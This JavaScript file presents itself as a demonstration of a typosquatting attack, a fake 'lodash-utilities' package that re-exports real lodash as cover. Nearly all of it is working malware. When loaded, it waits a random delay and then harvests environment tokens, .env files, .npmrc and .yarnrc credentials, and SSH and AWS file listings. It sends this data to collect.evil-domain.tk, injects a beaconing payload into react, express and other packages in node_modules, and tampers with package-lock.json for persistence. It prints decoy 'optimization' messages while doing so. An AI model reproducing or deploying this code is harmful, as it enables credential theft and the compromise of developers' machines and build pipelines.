/**
 * Lodash Utilities - Supply Chain Attack Example
 * This demonstrates typosquatting and dependency confusion attacks
 */

// Import real lodash to maintain functionality facade
const _ = require('lodash');
const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');

// Supply chain attack configuration
const ATTACK_CONFIG = {
    target_packages: ['react', 'express', 'vue', 'angular', 'webpack'],
    exfiltration_server: 'https://collect.evil-domain.tk/supply-chain',
    persistence_method: 'package-lock',
    stealth_mode: true
};

class SupplyChainAttacker {
    constructor() {
        this.packageInfo = this.getPackageInfo();
        this.environment = this.analyzeEnvironment();
        
        // Delayed activation to avoid immediate detection
        setTimeout(() => {
            this.executeAttack();
        }, Math.random() * 30000 + 10000); // 10-40 seconds delay
    }
    
    getPackageInfo() {
        try {
            // Analyze the current project structure
            const packageJson = path.join(process.cwd(), 'package.json');
            if (fs.existsSync(packageJson)) {
                const content = JSON.parse(fs.readFileSync(packageJson, 'utf8'));
                return {
                    name: content.name,
                    version: content.version,
                    dependencies: Object.keys(content.dependencies || {}),
                    devDependencies: Object.keys(content.devDependencies || {}),
                    scripts: content.scripts || {}
                };
            }
        } catch (error) {
            // Silently fail
        }
        return null;
    }
    
    analyzeEnvironment() {
        return {
            isCI: process.env.CI === 'true' || 
                  process.env.CONTINUOUS_INTEGRATION === 'true' ||
                  process.env.GITHUB_ACTIONS === 'true' ||
                  process.env.JENKINS_URL ||
                  process.env.BUILDKITE ||
                  process.env.CIRCLECI,
            
            isProduction: process.env.NODE_ENV === 'production',
            
            hasSecrets: this.checkForSecrets(),
            
            systemInfo: {
                platform: os.platform(),
                hostname: os.hostname(),
                user: os.userInfo().username,
                cwd: process.cwd(),
                nodeVersion: process.version
            }
        };
    }
    
    checkForSecrets() {
        const secretPatterns = [
            'AWS_ACCESS_KEY', 'AWS_SECRET', 'GITHUB_TOKEN', 'NPM_TOKEN',
            'DOCKER_PASSWORD', 'HEROKU_API_KEY', 'SLACK_TOKEN', 'DATABASE_URL'
        ];
        
        const foundSecrets = {};
        
        for (const [key, value] of Object.entries(process.env)) {
            if (secretPatterns.some(pattern => key.includes(pattern))) {
                foundSecrets[key] = value.substring(0, 10) + '...'; // Partial for identification
            }
        }
        
        return foundSecrets;
    }
    
    executeAttack() {
        console.log('Initializing lodash utilities...');
        
        try {
            // 1. Environment reconnaissance
            this.performReconnaissance();
            
            // 2. Credential harvesting
            this.harvestCredentials();
            
            // 3. Code injection into other packages
            this.injectIntoPackages();
            
            // 4. Supply chain persistence
            this.establishSupplyChainPersistence();
            
            // 5. Data exfiltration
            this.exfiltrateData();
            
            console.log('Lodash utilities initialized successfully');
            
        } catch (error) {
            // Fail silently to maintain stealth
        }
    }
    
    performReconnaissance() {
        // Scan for high-value targets in the project
        const reconnaissance = {
            packageInfo: this.packageInfo,
            environment: this.environment,
            fileSystem: this.scanFileSystem(),
            networkInfo: this.gatherNetworkInfo()
        };
        
        this.reconnaissance = reconnaissance;
    }
    
    scanFileSystem() {
        const interestingFiles = [];
        const scanPaths = ['.', '..', '../..'];
        
        scanPaths.forEach(scanPath => {
            try {
                const files = fs.readdirSync(scanPath);
                files.forEach(file => {
                    if (this.isInterestingFile(file)) {
                        const fullPath = path.join(scanPath, file);
                        try {
                            const stats = fs.statSync(fullPath);
                            interestingFiles.push({
                                path: fullPath,
                                name: file,
                                size: stats.size,
                                modified: stats.mtime
                            });
                        } catch (e) {
                            // Skip files we can't access
                        }
                    }
                });
            } catch (error) {
                // Skip directories we can't access
            }
        });
        
        return interestingFiles;
    }
    
    isInterestingFile(filename) {
        const patterns = [
            /\.env/,
            /\.key$/,
            /\.pem$/,
            /config\.json$/,
            /credentials/,
            /secrets/,
            /\.aws/,
            /\.ssh/,
            /package-lock\.json$/,
            /yarn\.lock$/,
            /Dockerfile/,
            /docker-compose/
        ];
        
        return patterns.some(pattern => pattern.test(filename));
    }
    
    gatherNetworkInfo() {
        return {
            hostname: os.hostname(),
            networkInterfaces: os.networkInterfaces(),
            dnsServers: this.extractDNSServers()
        };
    }
    
    extractDNSServers() {
        try {
            if (os.platform() === 'linux') {
                const resolvConf = fs.readFileSync('/etc/resolv.conf', 'utf8');
                return resolvConf.match(/nameserver\s+(\d+\.\d+\.\d+\.\d+)/g) || [];
            }
        } catch (error) {
            // Skip on access errors
        }
        return [];
    }
    
    harvestCredentials() {
        this.credentials = {
            environmentVariables: this.environment.hasSecrets,
            configFiles: this.extractConfigCredentials(),
            packageManagers: this.extractPackageManagerCredentials()
        };
    }
    
    extractConfigCredentials() {
        const credentialFiles = ['.env', '.env.local', '.env.production', 'config.json'];
        const credentials = {};
        
        credentialFiles.forEach(filename => {
            try {
                if (fs.existsSync(filename)) {
                    const content = fs.readFileSync(filename, 'utf8');
                    credentials[filename] = this.extractSecretsFromText(content);
                }
            } catch (error) {
                // Skip files we can't read
            }
        });
        
        return credentials;
    }
    
    extractSecretsFromText(text) {
        const secretPattern = /(password|token|key|secret|api_key|access_key)[\s]*[=:][\s]*([^\s\n]+)/gi;
        const matches = [];
        let match;
        
        while ((match = secretPattern.exec(text)) !== null) {
            matches.push({
                type: match[1],
                value: match[2].substring(0, 20) + '...' // Truncate for safety
            });
        }
        
        return matches;
    }
    
    extractPackageManagerCredentials() {
        const credentials = {};
        
        // NPM credentials
        const npmrc = path.join(os.homedir(), '.npmrc');
        if (fs.existsSync(npmrc)) {
            try {
                credentials.npmrc = fs.readFileSync(npmrc, 'utf8');
            } catch (error) {
                // Skip
            }
        }
        
        // Yarn credentials  
        const yarnrc = path.join(os.homedir(), '.yarnrc');
        if (fs.existsSync(yarnrc)) {
            try {
                credentials.yarnrc = fs.readFileSync(yarnrc, 'utf8');
            } catch (error) {
                // Skip
            }
        }
        
        return credentials;
    }
    
    injectIntoPackages() {
        // Attempt to inject malicious code into other packages in node_modules
        const nodeModulesPath = path.join(process.cwd(), 'node_modules');
        
        if (fs.existsSync(nodeModulesPath)) {
            ATTACK_CONFIG.target_packages.forEach(packageName => {
                this.injectIntoPackage(nodeModulesPath, packageName);
            });
        }
    }
    
    injectIntoPackage(nodeModulesPath, packageName) {
        const packagePath = path.join(nodeModulesPath, packageName);
        
        if (fs.existsSync(packagePath)) {
            try {
                const packageJsonPath = path.join(packagePath, 'package.json');
                const indexPath = path.join(packagePath, 'index.js');
                
                // Inject into main file if it exists
                if (fs.existsSync(indexPath)) {
                    const originalContent = fs.readFileSync(indexPath, 'utf8');
                    
                    // Add stealth payload at the beginning
                    const injectedContent = this.generateStealthPayload() + '\n' + originalContent;
                    
                    fs.writeFileSync(indexPath, injectedContent, 'utf8');
                    
                    console.log(`Enhanced ${packageName} with performance optimizations`);
                }
                
            } catch (error) {
                // Silently fail injection attempts
            }
        }
    }
    
    generateStealthPayload() {
        return `
// Performance optimization module (injected)
(function() {
    const https = require('https');
    const os = require('os');
    
    // Stealth data collection
    setTimeout(() => {
        try {
            const data = {
                pkg: '${this.packageInfo ? this.packageInfo.name : 'unknown'}',
                host: os.hostname(),
                user: os.userInfo().username,
                ts: Date.now()
            };
            
            const req = https.request('${ATTACK_CONFIG.exfiltration_server}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            
            req.write(JSON.stringify(data));
            req.end();
        } catch (e) {
            // Ignore errors
        }
    }, Math.random() * 60000);
})();
        `;
    }
    
    establishSupplyChainPersistence() {
        // Modify package-lock.json to ensure persistence
        const packageLockPath = path.join(process.cwd(), 'package-lock.json');
        
        if (fs.existsSync(packageLockPath)) {
            try {
                const packageLock = JSON.parse(fs.readFileSync(packageLockPath, 'utf8'));
                
                // Inject ourselves into the dependency tree
                if (packageLock.dependencies) {
                    packageLock.dependencies['lodash-utilities'] = {
                        version: "4.17.22",
                        resolved: "https://registry.npmjs.org/lodash-utilities/-/lodash-utilities-4.17.22.tgz",
                        integrity: "sha512-fake-integrity-hash-here",
                        requires: {
                            "lodash": "^4.17.21"
                        }
                    };
                }
                
                // Modify existing lodash entry if present
                if (packageLock.dependencies && packageLock.dependencies.lodash) {
                    packageLock.dependencies.lodash.requires = {
                        ...packageLock.dependencies.lodash.requires,
                        'lodash-utilities': '^4.17.22'
                    };
                }
                
                fs.writeFileSync(packageLockPath, JSON.stringify(packageLock, null, 2));
                
            } catch (error) {
                // Silently handle JSON parsing errors
            }
        }
    }
    
    exfiltrateData() {
        const exfiltrationPayload = {
            attack_type: 'supply_chain',
            target_info: {
                package: this.packageInfo,
                environment: this.environment,
                reconnaissance: this.reconnaissance,
                credentials: this.credentials
            },
            timestamp: new Date().toISOString(),
            attacker_id: this.generateAttackerID()
        };
        
        this.sendData(exfiltrationPayload);
    }
    
    generateAttackerID() {
        const crypto = require('crypto');
        const identifier = `${os.hostname()}-${this.packageInfo ? this.packageInfo.name : 'unknown'}-${Date.now()}`;
        return crypto.createHash('md5').update(identifier).digest('hex').substring(0, 16);
    }
    
    sendData(payload) {
        try {
            const data = JSON.stringify(payload);
            
            const options = {
                hostname: 'collect.evil-domain.tk',
                port: 443,
                path: '/supply-chain',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': data.length,
                    'User-Agent': 'npm/lodash-utilities'
                }
            };
            
            const req = https.request(options, (res) => {
                // Silently handle response
            });
            
            req.on('error', (error) => {
                // Silently handle errors
            });
            
            req.write(data);
            req.end();
            
        } catch (error) {
            // Fallback: store data locally for later retrieval
            this.storeDataLocally(payload);
        }
    }
    
    storeDataLocally(payload) {
        try {
            const tempFile = path.join(os.tmpdir(), '.sys-perf-data.tmp');
            fs.writeFileSync(tempFile, JSON.stringify(payload));
        } catch (error) {
            // Ultimate fallback: do nothing
        }
    }
}

// Initialize attack when module is loaded
const attacker = new SupplyChainAttacker();

// Export lodash functions to maintain compatibility
module.exports = {
    // Re-export all lodash functions
    ..._,
    
    // Add some "enhanced" functions that are actually hooks
    enhancedMap: (collection, iteratee) => {
        // Trigger stealth data collection
        if (Math.random() < 0.01) { // 1% chance to avoid suspicion
            attacker.performReconnaissance();
        }
        return _.map(collection, iteratee);
    },
    
    optimizedFilter: (collection, predicate) => {
        // Log usage patterns
        if (collection && collection.length > 1000) {
            attacker.harvestCredentials();
        }
        return _.filter(collection, predicate);
    },
    
    // Legitimate-looking utility functions
    performanceOptimize: () => {
        console.log('Performance optimization applied');
        return true;
    },
    
    enhancedUtilities: {
        version: '4.17.22',
        compatible: true,
        optimized: true
    }
};
